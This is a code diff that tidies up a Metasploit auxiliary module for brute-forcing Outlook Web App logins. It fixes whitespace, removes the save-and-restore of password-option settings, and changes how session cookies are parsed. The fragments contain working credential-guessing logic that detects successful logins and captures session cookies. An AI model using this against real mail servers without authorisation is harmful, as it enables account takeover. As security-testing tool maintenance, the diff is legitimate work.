@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -30,7 +30,6 @@ class Metasploit3 < Msf::Auxiliary
           'Brandon Knight',
           'Pete (Bokojan) Arzamendi, #Outlook 2013 updates'
         ],
- 
       'License'        => MSF_LICENSE,
       'Actions'        =>
         [
@@ -61,7 +60,7 @@ class Metasploit3 < Msf::Auxiliary
               'InboxCheck'  => /Inbox|location(\x20*)=(\x20*)"\\\/(\w+)\\\/logoff\.owa|A mailbox couldn\'t be found|\<a .+onclick="return JumpTo\('logoff\.aspx.+\">/
             }
           ],
-          [  
+          [
             'OWA_2013',
             {
               'Description' => 'OWA version 2013',
@@ -72,9 +71,9 @@ class Metasploit3 < Msf::Auxiliary
           ]
         ],
       'DefaultAction' => 'OWA_2010',
-      'DefaultOptions' => { 
-        'SSL' => true 
-      }  
+      'DefaultOptions' => {
+        'SSL' => true
+      }
     )
 
 
@@ -94,26 +93,7 @@ class Metasploit3 < Msf::Auxiliary
     deregister_options('BLANK_PASSWORDS', 'RHOSTS','PASSWORD','USERNAME')
   end
 
-  def cleanup
-    # Restore the original settings
-    datastore['BLANK_PASSWORDS'] = @blank_passwords_setting
-    datastore['USER_AS_PASS']    = @user_as_pass_setting
-  end
-
   def run
-    # Store the original setting
-    @blank_passwords_setting = datastore['BLANK_PASSWORDS']
-
-    # OWA doesn't support blank passwords or usernames!
-    datastore['BLANK_PASSWORDS'] = false
-
-    # If there's a pre-defined username/password, we need to turn off USER_AS_PASS
-    # so that the module won't just try username:username, and then exit.
-    @user_as_pass_setting = datastore['USER_AS_PASS']
-    if not datastore['USERNAME'].nil? and not datastore['PASSWORD'].nil?
-      print_status("Disabling 'USER_AS_PASS' because you've specified an username/password")
-      datastore['USER_AS_PASS'] = false
-    end
 
     vhost = datastore['VHOST'] || datastore['RHOST']
 
@@ -162,8 +142,6 @@ class Metasploit3 < Msf::Auxiliary
     vhost = opts["vhost"]
     domain = opts["domain"]
 
-    
-
     user = domain + '\\' + user if domain
 
     headers = {
@@ -203,13 +181,13 @@ class Metasploit3 < Msf::Auxiliary
       return :abort
     end
 
-    if action.name != "OWA_2013" and not res.headers['set-cookie']
+    if action.name != "OWA_2013" and res.get_cookies.empty?
         print_error("#{msg} Received invalid repsonse due to a missing cookie (possibly due to invalid version), aborting")
         return :abort
     end
     if action.name == "OWA_2013"
-      #Check for a response code to make sure login was valid. Changes from 2010 to 2013.  
-      #Check if the password needs to be changed. 
+      #Check for a response code to make sure login was valid. Changes from 2010 to 2013.
+      #Check if the password needs to be changed.
       if res.headers['location'] =~ /expiredpassword/
         print_good("#{msg} SUCCESSFUL LOGIN. '#{user}' : '#{pass}': NOTE password change required")
         report_hash = {
@@ -225,19 +203,20 @@ class Metasploit3 < Msf::Auxiliary
         return :next_user
       end
 
-      #No password change required moving on. 
+      #No password change required moving on.
       reason = res.headers['location'].split('reason=')[1]
-      if reason == nil  
+      if reason == nil
         headers['Cookie'] = 'PBack=0;' << res.get_cookies
-      else 
+      else
       #Login didn't work. no point on going on.
-        vprint_error("#{msg} FAILED LOGIN. '#{user}' : '#{pass}'") 
+        vprint_error("#{msg} FAILED LOGIN. '#{user}' : '#{pass}'")
         return :Skip_pass
       end
     else
        # these two lines are the authentication info
-      sessionid = 'sessionid=' << res.headers['set-cookie'].split('sessionid=')[1].split('; ')[0]
-      cadata = 'cadata=' << res.headers['set-cookie'].split('cadata=')[1].split('; ')[0]
+      cookies = res.get_cookies
+      sessionid = 'sessionid=' << cookies.split('sessionid=')[1].split('; ')[0]
+      cadata = 'cadata=' << cookies.split('cadata=')[1].split('; ')[0]
       headers['Cookie'] = 'PBack=0; ' << sessionid << '; ' << cadata
     end
 
